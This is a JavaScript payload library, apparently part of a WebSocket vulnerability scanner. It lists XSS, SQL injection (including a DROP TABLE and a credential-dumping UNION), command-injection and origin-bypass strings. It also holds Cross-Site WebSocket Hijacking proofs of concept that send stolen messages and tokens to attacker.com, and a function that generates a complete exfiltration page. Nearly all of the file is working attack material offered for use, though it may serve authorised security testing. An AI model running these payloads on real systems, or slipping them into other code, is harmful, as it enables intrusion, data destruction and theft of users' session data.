// WebSocket Scanner Payloads
// Comprehensive payload database for WebSocket vulnerability testing

const WebSocketPayloads = {
    // XSS via WebSocket messages
    xssPayloads: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(document.domain)</script>',
        '<img src=1 onerror="alert(\'XSS\')">',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '{{constructor.constructor("alert(1)")()}}'
    ],

    // SQL Injection via WebSocket
    sqliPayloads: [
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "'; DROP TABLE users--",
        "1 UNION SELECT null,username,password FROM users--"
    ],

    // Command Injection via WebSocket
    cmdiPayloads: [
        '; whoami',
        '| id',
        '`id`',
        '$(whoami)'
    ],

    // CSWSH (Cross-Site WebSocket Hijacking) PoC
    cswshPayloads: [
        {
            name: 'Basic CSWSH',
            description: 'Hijack WebSocket from attacker page',
            poc: `<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = function() {
    ws.send('READY');
};
ws.onmessage = function(event) {
    fetch('https://attacker.com/log?data=' + btoa(event.data));
};
</script>`
        },
        {
            name: 'CSWSH with CSRF token extraction',
            description: 'Extract sensitive data via WebSocket',
            poc: `<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onmessage = function(event) {
    var data = JSON.parse(event.data);
    if (data.token) {
        new Image().src = 'https://attacker.com/?token=' + data.token;
    }
};
</script>`
        }
    ],

    // Message manipulation payloads
    messageManipulation: [
        { original: '{"user":"wiener","message":"Hello"}', modified: '{"user":"administrator","message":"Hello"}' },
        { original: '{"action":"read"}', modified: '{"action":"delete"}' },
        { original: '{"id":1}', modified: '{"id":999}' },
        { original: '{"role":"user"}', modified: '{"role":"admin"}' }
    ],

    // Origin bypass techniques
    originBypass: [
        'null',
        'https://attacker.com',
        'https://TARGET.attacker.com',
        'https://attackerTARGET.com'
    ],

    // Protocol manipulation
    protocolTests: [
        { protocol: 'ws://', description: 'Unencrypted WebSocket' },
        { protocol: 'wss://', description: 'Encrypted WebSocket' }
    ]
};

// Test scenarios
const WebSocketTests = {
    xss: {
        name: 'XSS via WebSocket',
        description: 'Inject XSS payloads through WebSocket messages',
        severity: 'HIGH'
    },
    cswsh: {
        name: 'Cross-Site WebSocket Hijacking',
        description: 'Hijack WebSocket connection from attacker-controlled page',
        severity: 'CRITICAL'
    },
    messageManipulation: {
        name: 'Message Manipulation',
        description: 'Modify WebSocket messages to escalate privileges',
        severity: 'HIGH'
    },
    sqli: {
        name: 'SQL Injection via WebSocket',
        description: 'Inject SQL payloads through WebSocket messages',
        severity: 'CRITICAL'
    },
    originValidation: {
        name: 'Origin Validation Bypass',
        description: 'Bypass origin checks on WebSocket handshake',
        severity: 'HIGH'
    }
};

// Helper functions
function getXSSPayloads() {
    return WebSocketPayloads.xssPayloads;
}

function getCSWSHPayloads() {
    return WebSocketPayloads.cswshPayloads;
}

function getMessageManipulationPayloads() {
    return WebSocketPayloads.messageManipulation;
}

function getPayloadCount() {
    return WebSocketPayloads.xssPayloads.length +
        WebSocketPayloads.sqliPayloads.length +
        WebSocketPayloads.cmdiPayloads.length +
        WebSocketPayloads.cswshPayloads.length +
        WebSocketPayloads.messageManipulation.length +
        WebSocketPayloads.originBypass.length;
}

function generateCSWSHPoC(targetUrl, attackerUrl) {
    return `<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var ws = new WebSocket('${targetUrl}');
ws.onopen = function() {
    console.log('WebSocket connected');
    ws.send('READY');
};
ws.onmessage = function(event) {
    console.log('Received:', event.data);
    // Exfiltrate to attacker
    fetch('${attackerUrl}/log', {
        method: 'POST',
        body: event.data
    });
};
ws.onerror = function(error) {
    console.log('Error:', error);
};
</script>
<h1>CSWSH Proof of Concept</h1>
<p>Check console for WebSocket messages</p>
</body>
</html>`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        WebSocketPayloads,
        WebSocketTests,
        getXSSPayloads,
        getCSWSHPayloads,
        getMessageManipulationPayloads,
        getPayloadCount,
        generateCSWSHPoC
    };
}
